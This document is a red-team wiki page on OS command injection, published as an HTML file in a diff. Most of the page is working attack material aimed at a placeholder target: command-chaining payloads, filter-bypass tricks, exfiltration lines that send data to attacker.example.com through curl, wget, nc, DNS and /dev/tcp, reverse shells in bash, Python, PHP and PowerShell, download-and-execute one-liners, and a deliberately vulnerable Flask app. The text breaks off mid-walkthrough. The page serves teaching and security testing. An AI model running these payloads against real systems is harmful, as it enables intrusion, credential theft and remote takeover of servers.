@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Command Injection | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Command Injection">
+		<meta name="keywords" content="command-injection, filter-bypass, os-command-injection, rce, redteam, shell">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Command Injection">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Exploiting applications that pass user-controlled input to system shell interpreters to execute arbitrary operating system commands.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/command-injection.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Command Injection">
+		<meta name="twitter:description" itemprop="description" content="Exploiting applications that pass user-controlled input to system shell interpreters to execute arbitrary operating system commands.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#how-command-injection-happens">How Command Injection Happens</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#functions-that-invoke-shells">Functions that Invoke Shells</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#command-chaining-operators">Command Chaining Operators</a></b>
+					<ul>
+						<li><a href="#ping-specific-detection">Ping-Specific Detection</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#blind-command-injection">Blind Command Injection</a></b>
+					<ul>
+						<li><a href="#time-based-detection">Time-Based Detection</a></li>
+						<li><a href="#out-of-band-detection">Out-of-Band Detection</a></li>
+						<li><a href="#file-based-detection">File-Based Detection</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#filter-bypass-techniques">Filter Bypass Techniques</a></b>
+					<ul>
+						<li><a href="#whitespace-bypass">Whitespace bypass</a></li>
+						<li><a href="#command-separator-bypass">Command Separator Bypass</a></li>
+						<li><a href="#character-blacklist-bypass">Character blacklist bypass</a></li>
+						<li><a href="#character-concatenation-bypass">Character concatenation bypass</a></li>
+						<li><a href="#wildcard-bypass">Wildcard Bypass</a></li>
+						<li><a href="#blacklisted-word-bypass">Blacklisted word bypass</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-injection-points-beyond-ping">Common Injection Points Beyond Ping</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#from-injection-to-reverse-shell">From Injection to Reverse Shell</a></b>
+					<ul>
+						<li><a href="#reverse-shell-listener-setup">Reverse Shell Listener Setup</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#windows-command-injection-differences">Windows Command Injection Differences</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#manual-exploitation-walkthrough">Manual Exploitation Walkthrough</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#safe-api-alternatives">Safe API Alternatives</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-commands">Verification Commands</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/command-injection.html">Command Injection</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="command-injection">Command Injection</h2>
+					<p>
+						Exploiting applications that pass user-controlled input to system shell interpreters to execute
+						arbitrary operating system commands.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Command injection happens when untrusted input reaches a shell interpreter. This article shows
+							how to recognize the vulnerable functions, how shell metacharacters chain commands, how to confirm
+							and exploit blind injection through time and network side channels, and how to defeat the naive
+							blacklist filters that applications still rely on.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - fork, exec, process lifecycle, parent/child relationships</li>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">System Calls</a> - syscall interface, execve, pipes, file descriptors</li>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - request parameters, headers, request/response structure</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="how-command-injection-happens">How Command Injection Happens</h3>
+						<p>
+							Every command injection vulnerability shares a single root cause: user-controlled data reaching
+							a function that invokes a shell interpreter. The critical distinction is between
+							<code>exec*</code>
+							functions
+							and shell-invoking functions.
+						</p>
+						<pre class="plaintext">
+execve(&#34;/bin/ping&#34;, [&#34;ping&#34;, &#34;-c&#34;, &#34;1&#34;, user_input], env)
+  → user_input is argument[3] to the ping binary
+  → No shell involved. $, ;, &amp;&amp;, | are passed literally to ping
+  → SAFE
+
+system(f&#34;ping -c 1 {user_input}&#34;)
+  → The string is passed to /bin/sh -c &#34;...&#34;
+  → Shell interprets ; | &amp;&amp; $() `` as operators
+  → VULNERABLE
+						</pre>
+						<p>
+							The core insight: a shell is a programming language interpreter. When user input reaches a shell,
+							the user can write code in that language. The defense is preventing user data from ever reaching
+							a shell - use
+							<code>execve</code>
+							directly with argument arrays.
+						</p>
+					</section>
+					<section>
+						<h3 id="functions-that-invoke-shells">Functions that Invoke Shells</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Language</th>
+									<th align="center">Shell-Invoking (Vulnerable)</th>
+									<th align="center">Safe Alternative</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">C</td>
+									<td align="center"><code>system()</code>,<code>popen()</code></td>
+									<td align="center"><code>execve()</code>,<code>fork()</code>+<code>execve()</code></td>
+								</tr>
+								<tr>
+									<td align="center">Python</td>
+									<td align="center"><code>os.system()</code>,<code>subprocess.call(shell=True)</code>,<code>os.popen()</code></td>
+									<td align="center"><code>subprocess.run([...], shell=False)</code></td>
+								</tr>
+								<tr>
+									<td align="center">PHP</td>
+									<td align="center"><code>system()</code>,<code>exec()</code>,<code>passthru()</code>,<code>shell_exec()</code>, backticks</td>
+									<td align="center"><code>pcntl_exec()</code>(rarely used)</td>
+								</tr>
+								<tr>
+									<td align="center">Ruby</td>
+									<td align="center"><code>exec([cmd, arg1, arg2])</code></td>
+								</tr>
+								<tr>
+									<td align="center">Node.js</td>
+									<td align="center"><code>child_process.exec()</code>,<code>child_process.execSync()</code></td>
+									<td align="center"><code>child_process.spawn(cmd, [args])</code></td>
+								</tr>
+								<tr>
+									<td align="center">Perl</td>
+									<td align="center"><code>system()</code>,<code>exec()</code>,<code>qx/cmd/</code>, backticks</td>
+									<td align="center"><code>exec {cmd} cmd, arg1, arg2</code></td>
+								</tr>
+								<tr>
+									<td align="center">Java</td>
+									<td align="center"><code>Runtime.exec(String)</code>(tokenizes on whitespace)</td>
+									<td align="center"><code>ProcessBuilder([&#34;cmd&#34;, &#34;arg&#34;])</code></td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="command-chaining-operators">Command Chaining Operators</h3>
+						<p>
+							The shell interprets these metacharacters as command separators. Their behavior differs in how
+							they handle exit codes.
+						</p>
+						<pre class="bash">
+# Operator reference
+command1 ; command2     # Execute command2 regardless of command1&#39;s exit code
+command1 &amp;&amp; command2    # Execute command2 ONLY if command1 succeeds (exit 0)
+command1 || command2    # Execute command2 ONLY if command1 fails (exit non-zero)
+command1 | command2     # Pipe stdout of command1 to stdin of command2
+command1 `command2`     # Execute command2, substitute its output into command1&#39;s args
+command1 $(command2)    # Same as backticks, modern syntax
+command1 \n command2    # Newline as separator (in some parsing contexts)
+						</pre>
+						<pre class="bash">
+# Applying operators to injection points
+# Base request: POST /ping  host=8.8.8.8
+# Server runs: ping -c 4 8.8.8.8
+
+# Semicolon — always executes
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; id&#39;
+
+# Backticks — inline command substitution
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8`id`&#39;
+
+# $() — modern substitution
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8$(id)&#39;
+
+# Pipe — redirect output through attacker command
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8 | id&#39;
+
+# AND — only if ping succeeds
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8 &amp;&amp; id&#39;
+
+# OR — executes if ping FAILS (useful when ping output isn&#39;t shown)
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8 || id&#39;
+
+# Newline injection — some parsers split on \n before exec
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8%0aid&#39;
+						</pre>
+						<h4 id="ping-specific-detection">Ping-Specific Detection</h4>
+						<p>Ping forms are the most common command injection entry points:</p>
+						<pre class="bash">
+# If the app runs: ping -c 4 $user_input
+# Injection payloads:
+8.8.8.8; ls -la /
+8.8.8.8 &amp;&amp; whoami
+8.8.8.8 | cat /etc/passwd
+$(id)                          # If backtick handler removed the host
+`curl http://attacker.com/?data=$(whoami)`
+						</pre>
+					</section>
+					<section>
+						<h3 id="blind-command-injection">Blind Command Injection</h3>
+						<p>When the command output is not reflected in the response, detection requires side-channel observation.</p>
+						<h4 id="time-based-detection">Time-Based Detection</h4>
+						<p>The command sleeps when the injection is successful:</p>
+						<pre class="bash">
+# Ping test
+curl -s -w &#39;\nTime: %{time_total}s\n&#39; \
+  --data-urlencode &#39;host=8.8.8.8; sleep 5&#39; \
+  &#39;https://target.example.com/ping&#39;
+# If response time &gt;= 5 seconds → injection confirmed
+
+# Alternative: ping to localhost with specific count
+curl -s -w &#39;\nTime: %{time_total}s\n&#39; \
+  --data-urlencode &#39;host=8.8.8.8; ping -c 5 127.0.0.1&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# Alternative: write file then check for it
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; touch /tmp/pwned_by_command_injection&#39;
+# If you have a second injection or file read, check for /tmp/pwned_by_command_injection
+						</pre>
+						<h4 id="out-of-band-detection">Out-of-Band Detection</h4>
+						<p>Exfiltrate data through network requests to your own server:</p>
+						<pre class="bash">
+# Setup listener on attacker machine
+# On ArchLinux: sudo pacman -S ncat
+ncat -lvnp 4444
+# Or with Python:
+python3 -c &#34;import http.server; http.server.HTTPServer((&#39;0.0.0.0&#39;, 8080), http.server.SimpleHTTPRequestHandler).serve_forever()&#34;
+
+# DNS exfiltration
+curl -s --data-urlencode &#39;host=8.8.8.8; nslookup $(whoami).attacker.example.com&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# HTTP exfiltration — curl
+curl -s --data-urlencode &#39;host=8.8.8.8; curl http://attacker.example.com:8080/$(whoami)&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# HTTP exfiltration — wget
+curl -s --data-urlencode &#39;host=8.8.8.8; wget http://attacker.example.com:8080/$(id | base64)&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# OOB with netcat (if available)
+curl -s --data-urlencode &#39;host=8.8.8.8; echo $(id) | nc attacker.example.com 4444&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# /dev/tcp (bash only, common on Linux)
+curl -s --data-urlencode &#39;host=8.8.8.8; exec 3&lt;&gt;/dev/tcp/attacker.example.com/4444; echo $(whoami) &gt;&amp;3&#39; \
+  &#39;https://target.example.com/ping&#39;
+						</pre>
+						<h4 id="file-based-detection">File-Based Detection</h4>
+						<p>Write command output to the web root:</p>
+						<pre class="bash">
+# Write to common web root locations
+curl -s --data-urlencode &#39;host=8.8.8.8; id &gt; /var/www/html/output.txt&#39; \
+  &#39;https://target.example.com/ping&#39;
+# Then access: https://target.example.com/output.txt
+
+# Other writable paths to try
+# /tmp/output.txt → if you have another injection or LFI to read it
+# /var/www/html/ → Apache default
+# /usr/share/nginx/html/ → nginx default
+# /opt/tomcat/webapps/ROOT/ → Tomcat
+# /var/www/ → generic
+						</pre>
+					</section>
+					<section>
+						<h3 id="filter-bypass-techniques">Filter Bypass Techniques</h3>
+						<p>
+							Applications often implement blacklist filters on user input. These filters are almost always
+							breakable because the shell's syntax is too flexible.
+						</p>
+						<h4 id="whitespace-bypass">Whitespace bypass</h4>
+						<pre class="bash">
+# ${IFS} — Internal Field Separator (default: space, tab, newline)
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+ls${IFS}-la
+
+# Tab character (%09)
+curl -s --data-urlencode &#39;host=8.8.8.8;cat%09/etc/passwd&#39; \
+  &#39;https://target.example.com/ping&#39;
+
+# Brace expansion (bash)
+{cat,/etc/passwd}
+
+# Variable assignment as space substitute
+X=$&#39;\x20cat\x20/etc/passwd&#39; &amp;&amp; $X
+
+# Input redirection
+cat&lt;/etc/passwd
+
+# No space at all — use command substitution
+$(cat&lt;/etc/passwd)
+`cat&lt;/etc/passwd`
+						</pre>
+						<h4 id="command-separator-bypass">Command Separator Bypass</h4>
+						<pre class="bash">
+# URL-encoded separators (single encode)
+%0a  → newline
+%0d  → carriage return (sometimes alone, sometimes %0d%0a)
+%3b  → semicolon
+%26  → ampersand
+
+# Double URL-encoding (if app decodes once, WAF checks, then app decodes again)
+%250a → %0a after first decode → newline after second decode
+%253b → %3b after first decode → ; after second decode
+
+# Test with:
+curl -s --data-urlencode &#39;host=8.8.8.8%0aid&#39; &#39;https://target.example.com/ping&#39;
+curl -s --data-urlencode &#39;host=8.8.8.8%250aid&#39; &#39;https://target.example.com/ping&#39;
+
+# Unicode line separator
+%E2%80%A8  # Unicode line separator U+2028
+						</pre>
+						<h4 id="character-blacklist-bypass">Character blacklist bypass</h4>
+						<pre class="bash">
+# If specific characters are blocked (/ ; space etc):
+# Use encoding tricks to generate them at runtime
+
+# tr — translate characters
+cat $(echo &#39;L2V0Yy9wYXNzd2QK&#39; | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;)  # base64 → rotate13
+echo &#39;L2V0Yy9wYXNzd2QK&#39; | base64 -d | bash  # base64 decode
+
+# Hexadecimal
+echo $&#39;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39; | bash
+
+# Octal
+echo $&#39;\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144&#39; | bash
+
+# printf
+printf &#39;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&#39; | bash
+
+# awk
+awk &#39;BEGIN{printf &#34;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#34;,99,97,116,32,47,101,116,99,47,112,97,115,115,119,100}&#39; | bash
+						</pre>
+						<h4 id="character-concatenation-bypass">Character concatenation bypass</h4>
+						<pre class="bash">
+# If the filter blocks &#34;cat&#34; but allows individual characters:
+# Concatenation via single quotes
+c&#39;a&#39;t /etc/passwd
+&#39;c&#39;&#34;a&#34;&#39;t&#39; /etc/passwd
+
+# Concatenation via variables
+a=c; b=at; $a$b /etc/passwd
+
+# Concatenation via backticks/substitution
+`echo c``echo a``echo t` /etc/passwd
+$(echo c)$(echo a)$(echo t) /etc/passwd
+
+# Case variation
+# If &#34;cat&#34; is filtered but case matters:
+CAT /etc/passwd   # Fails on case-sensitive filesystems but test
+CaT /etc/passwd
+$(tr &#39;[A-Z]&#39; &#39;[a-z]&#39; &lt;&lt;&lt;&#39;CAT&#39;) /etc/passwd  # lowercase conversion
+						</pre>
+						<h4 id="wildcard-bypass">Wildcard Bypass</h4>
+						<pre class="bash">
+# ? matches single character
+cat /etc/passw?
+cat /???/????wd
+
+# * matches any characters
+cat /etc/p*
+cat /e*/p*
+
+# Brackets for character sets
+cat /etc/[p]asswd
+cat /etc/p[a][s][s]w[d]
+						</pre>
+						<h4 id="blacklisted-word-bypass">Blacklisted word bypass</h4>
+						<pre class="bash">
+# Double quotes break word into tokens (shell still reassembles)
+c&#34;a&#34;t /etc/passwd
+
+# Backslash escaping within words
+c\a\t /etc/passwd
+
+# Variable default values
+cat ${PATH:0:1}etc${PATH:0:1}passwd  # Uses / from PATH
+
+# Environment variable extraction
+echo $SHELL
+echo ${SHELL:0:1}bin${SHELL:0:1}cat
+
+# History expansion
+!! # Executes previous command (in interactive bash)
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-injection-points-beyond-ping">Common Injection Points Beyond Ping</h3>
+						<p>Any user input that is passed to a shell function is a potential injection point.</p>
+						<pre class="bash">
+# File upload — filename used in convert/move command
+# Upload: file named &#34;image.jpg; id &gt; /var/www/html/pwned.txt&#34;
+curl -X POST https://target.example.com/upload \
+  -F &#34;file=@test.jpg;filename=test.jpg; id &gt; /var/www/html/pwned.txt&#34;
+
+# Email sending form — from/to/subject passed to sendmail
+curl -X POST https://target.example.com/contact \
+  --data-urlencode &#39;email=user@example.com; id &gt; /tmp/pwned&#39;
+
+# ZIP extraction — filename in ZIP used unsafely
+# Create a ZIP with a file named: &#34;$(id &gt; /tmp/pwned).txt&#34;
+
+# PDF/image conversion — filename in ImageMagick, Ghostscript, LibreOffice CLI
+curl -X POST https://target.example.com/convert \
+  --data-urlencode &#39;input=test.pdf&amp;output=output; id &gt; /tmp/pwned&#39;  # output param injectable
+
+# Cron job form — cron expression passed to crontab
+curl -X POST https://target.example.com/schedule \
+  --data-urlencode &#39;cron=* * * * * root id &gt; /tmp/pwned&#39;
+
+# Database backup form — filename in mysqldump/pg_dump
+curl -X POST https://target.example.com/backup \
+  --data-urlencode &#39;filename=backup; id &gt; /tmp/pwned.sql&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="from-injection-to-reverse-shell">From Injection to Reverse Shell</h3>
+						<p>Detection → Confirmation → File Read → Reverse Shell.</p>
+						<pre class="bash">
+# Attacker machine: start listener
+ncat -lvnp 4444
+
+# Phase 1: Basic detection
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; echo vulnerable&#39;
+
+# Phase 2: Verify command execution and enumerate
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; id&#39;
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; uname -a&#39;
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; which nc ncat python3 python bash sh&#39;
+
+# Phase 3: Attempt reverse shell — try multiple methods
+# Bash reverse shell
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#34;host=8.8.8.8; bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.0.0.1/4444 &lt;&amp;1&#39;&#34;
+
+# netcat reverse shell (Traditional netcat: -e flag)
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; nc 10.0.0.1 4444 -e /bin/bash&#39;
+
+# netcat reverse shell (OpenBSD netcat: no -e)
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.0.0.1 4444 &gt; /tmp/f&#39;
+
+# Python reverse shell
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#34;host=8.8.8.8; python3 -c &#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\&#34;10.0.0.1\&#34;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\&#34;/bin/bash\&#34;,\&#34;-i\&#34;])&#39;&#34;
+
+# PHP reverse shell (if PHP is available)
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#34;host=8.8.8.8; php -r &#39;\$sock=fsockopen(\&#34;10.0.0.1\&#34;,4444); exec(\&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;
+
+# Curl-based: download and execute a script
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; curl http://10.0.0.1/shell.sh | bash&#39;
+
+# wget-based: download and execute
+curl -s -X POST &#39;https://target.example.com/ping&#39; \
+  --data-urlencode &#39;host=8.8.8.8; wget -O /tmp/shell.sh http://10.0.0.1/shell.sh; bash /tmp/shell.sh&#39;
+						</pre>
+						<h4 id="reverse-shell-listener-setup">Reverse Shell Listener Setup</h4>
+						<pre class="bash">
+# Option A: netcat
+sudo pacman -S ncat
+ncat -lvnp 4444
+
+# Option B: pwncat-cs (upgraded netcat with better shell handling)
+sudo pacman -S pwncat-cs
+pwncat-cs -lp 4444
+
+# Option C: Python listener
+python3 -c &#34;
+import socket, os, pty
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((&#39;0.0.0.0&#39;, 4444))
+s.listen(1)
+conn, addr = s.accept()
+os.dup2(conn.fileno(), 0)
+os.dup2(conn.fileno(), 1)
+os.dup2(conn.fileno(), 2)
+pty.spawn(&#39;/bin/bash&#39;)
+conn.close()
+&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="windows-command-injection-differences">Windows Command Injection Differences</h3>
+						<p>
+							Windows
+							<code>cmd.exe</code>
+							has different operators and syntax than
+							<code>/bin/sh</code>
+							. These are critical when
+							the target runs on Windows with IIS or ASP.NET.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Unix (/bin/sh)</th>
+									<th align="center">Windows (cmd.exe)</th>
+									<th align="center">Behavior</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>;</code></td>
+									<td align="center"><code>&amp;</code></td>
+									<td align="center">Always execute next command</td>
+								</tr>
+								<tr>
+									<td align="center"><code>&amp;&amp;</code></td>
+									<td align="center"><code>&amp;&amp;</code></td>
+									<td align="center">Execute next if previous succeeds</td>
+								</tr>
+								<tr>
+									<td align="center"><code>\|\|</code></td>
+									<td align="center"><code>\|\|</code></td>
+									<td align="center">Execute next if previous fails</td>
+								</tr>
+								<tr>
+									<td align="center"><code>\|</code></td>
+									<td align="center"><code>\|</code></td>
+									<td align="center">Pipe stdout</td>
+								</tr>
+								<tr>
+									<td align="center">N/A</td>
+									<td align="center">No backtick substitution in cmd.exe</td>
+								</tr>
+								<tr>
+									<td align="center"><code>$(cmd)</code></td>
+									<td align="center">N/A</td>
+									<td align="center">No $() in cmd.exe</td>
+								</tr>
+								<tr>
+									<td align="center">N/A</td>
+									<td align="center"><code>%VAR%</code></td>
+									<td align="center">Variable expansion</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/</code></td>
+									<td align="center"><code>\</code></td>
+									<td align="center">Path separator</td>
+								</tr>
+							</tbody>
+						</table>
+						<pre class="bash">
+# Windows injection payloads
+8.8.8.8 &amp; whoami
+8.8.8.8 &amp; type C:\Windows\System32\drivers\etc\hosts
+8.8.8.8 &amp; dir C:\inetpub\wwwroot\
+
+# Windows reverse shell (PowerShell)
+8.8.8.8 &amp; powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()&#34;
+
+# Windows file write via certutil
+8.8.8.8 &amp; certutil -urlcache -f http://10.0.0.1/shell.exe shell.exe &amp; shell.exe
+						</pre>
+					</section>
+					<section>
+						<h3 id="manual-exploitation-walkthrough">Manual Exploitation Walkthrough</h3>
+						<p>
+							A complete exploit against a vulnerable network diagnostic tool. The application has a form
+							that runs
+							<code>ping -c 4 {user_input}</code>
+							.
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Vulnerable Flask app — ping utility with command injection.
+Includes: basic injection, filtered injection, blind injection.
+&#34;&#34;&#34;
+from flask import Flask, request, render_template_string
+import subprocess
+import re
+
+app = Flask(__name__)
+
+HTML = &#34;&#34;&#34;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;Network Diagnostic Tool&lt;/h2&gt;
+&lt;hr&gt;
+
+&lt;h3&gt;Level 1: Basic Ping (no filter)&lt;/h3&gt;
+&lt;form method=&#34;POST&#34; action=&#34;/ping&#34;&gt;
+  &lt;input name=&#34;host&#34; placeholder=&#34;IP address&#34; value=&#34;8.8.8.8&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;Ping&#34;&gt;
+&lt;/form&gt;
+{% if ping1 %}&lt;pre&gt;{{ ping1 }}&lt;/pre&gt;{% endif %}
+&lt;hr&gt;
+
+&lt;h3&gt;Level 2: Filtered Ping (strips spaces and semicolons)&lt;/h3&gt;
+&lt;form method=&#34;POST&#34; action=&#34;/ping-filtered&#34;&gt;
+  &lt;input name=&#34;host&#34; placeholder=&#34;IP address&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;Ping (Filtered)&#34;&gt;
+&lt;/form&gt;
+{% if ping2 %}&lt;pre&gt;{{ ping2 }}&lt;/pre&gt;{% endif %}
+&lt;hr&gt;
+
+&lt;h3&gt;Level 3: Blind Ping (no output, logs only)&lt;/h3&gt;
+&lt;form method=&#34;POST&#34; action=&#34;/ping-blind&#34;&gt;
+  &lt;input name=&#34;host&#34; placeholder=&#34;IP address&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;Ping (Blind)&#34;&gt;
+&lt;/form&gt;
+{% if ping3 %}&lt;p&gt;{{ ping3 }}&lt;/p&gt;{% endif %}
+&lt;/body&gt;&lt;/html&gt;
+&#34;&#34;&#34;
+
+@app.route(&#39;/ping&#39;, methods=[&#39;POST&#39;])
+def ping():
+    host = request.form.get(&#39;host&#39;, &#39;8.8.8.8&#39;)
+    # VULNERABLE: os.system() passes string to shell
+    import os
+    result = os.popen(f&#34;ping -c 4 {host} 2&gt;&amp;1&#34;).read()
+    return render_template_string(HTML, ping1=result)
+
+@app.route(&#39;/ping-filtered&#39;, methods=[&#39;POST&#39;])
+def ping_filtered():
+    host = request.form.get(&#39;host&#39;, &#39;8.8.8.8&#39;)
+    # WEAK FILTER: strips spaces and semicolons — trivial to bypass
+    host = host.replace(&#39; &#39;, &#39;&#39;).replace(&#39;;&#39;, &#39;&#39;)
+    result = subprocess.getoutput(f&#34;ping -c 4 {host} 2&gt;&amp;1&#34;)
+    return render_template_string(HTML, ping2=result)
+
+@app.route(&#39;/ping-blind&#39;, methods=[&#39;POST&#39;])
+def ping_blind():
+    host = request.form.get(&#39;host&#39;, &#39;8.8.8.8&#39;)
+    import os
+    os.system(f&#34;ping -c 4 {host} &gt; /dev/null 2&gt;&amp;1 &amp;&#34;)
+    return render_template_string(HTML, ping3=&#34;Ping executed. Check listener for callback.&#34;)
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=5000, debug=False)
+						</pre>
+						<pre class="bash">
+# Exploitation of Level 1 (no filter):
+curl -s -X POST http://localhost:5000/ping \
+  --data-urlencode &#39;host=8.8.8.8; id&#39;
+# Output: uid=1000(user) gid=1000(user) groups=1000(user)
+
+curl -s -X POST http://localhost:5000/ping \
+  --data-urlencode &#39;host=8.8.8.8; cat /etc/passwd&#39;
